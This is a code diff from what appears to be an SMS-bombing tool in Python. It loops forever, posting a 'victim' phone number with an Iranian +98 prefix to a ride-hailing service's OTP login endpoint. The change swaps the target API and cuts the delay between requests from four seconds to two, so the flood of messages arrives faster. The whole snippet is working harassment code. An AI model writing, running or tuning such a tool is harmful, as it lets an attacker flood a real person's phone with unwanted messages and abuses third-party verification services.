@@ -21,12 +21,12 @@ try:
     if NumberPhone == "" :
         print("\n[!] Please Enter Phone Number")
     else :
-        url = "https://balad.ir/api/auth/login/"
+        url = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
         data = {"cellphone":"+98" + NumberPhone}
 
     while True:
         requests.post(url,data=data)
         print("[+] Send SMS For Victim")
-        time.sleep(4)
+        time.sleep(2)
 except:
     print("\n[-] You Exit Tools !!")
